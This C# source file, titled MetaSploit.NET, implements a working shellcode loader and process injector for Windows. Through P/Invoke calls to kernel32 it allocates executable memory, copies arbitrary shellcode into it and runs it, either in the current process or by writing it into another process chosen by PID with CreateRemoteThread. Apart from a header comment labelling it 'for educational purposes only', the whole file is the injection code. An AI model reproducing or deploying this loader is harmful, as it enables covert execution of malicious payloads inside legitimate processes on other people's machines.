using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
namespace MetaSploit.NET
{
    /*
     * Copy Right(c) 2022
     * Author : BINM7MD
     * Name   : MetaSploit.NET
     * Contact Me : github.com/BINM7MD
     * This program is distributed for educational purposes only.
     * External Calls Resource : https://www.pinvoke.net 
     * Usage Local Process : MetaSploit.Run(ShellCode, false, 0);
     * Usage Remote Process : MetaSploit.Run(ShellCode, true, PID);
    */
    public static class MetaSploit
    {

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType lAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
         uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]

        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32", CharSet = CharSet.Ansi)]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        static IntPtr ThreadID;

        public static void Run(byte[] ShellCode , bool isRemoteProcess , int PID)
        {
            if (!isRemoteProcess && PID == 0)
            {
                IntPtr AllocateAddr = VirtualAlloc((IntPtr)0, (UIntPtr)ShellCode.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
                Marshal.Copy(ShellCode, 0, AllocateAddr, ShellCode.Length);
                IntPtr ThreadHandle;
                ThreadHandle = CreateThread((IntPtr)0, 0, AllocateAddr, (IntPtr)0, 0, ThreadID);
                Console.WriteLine("Allocate Address : {0} Thread Handle : {1}", AllocateAddr, ThreadHandle);
                WaitForSingleObject(ThreadHandle, -1);
            }
            else if (isRemoteProcess)
            {
                IntPtr hProccess = OpenProcess(ProcessAccessFlags.All, false, PID);

                IntPtr AllocateAddr = VirtualAllocEx(hProccess , (IntPtr)0 , (uint)ShellCode.Length , (uint)AllocationType.Commit , (uint)MemoryProtection.ExecuteReadWrite);
                UIntPtr Zero;
                WriteProcessMemory(hProccess, AllocateAddr, ShellCode, (uint)ShellCode.Length, out Zero);
                IntPtr ThreadHandle;
                ThreadHandle = CreateRemoteThread(hProccess, (IntPtr)0, 0, AllocateAddr, (IntPtr)0, 0, ThreadID);
                Console.WriteLine("Allocate Address : {0} Thread Handle : {1}", AllocateAddr, ThreadHandle);
                WaitForSingleObject(ThreadHandle, -1);

            }
        }
    }
}
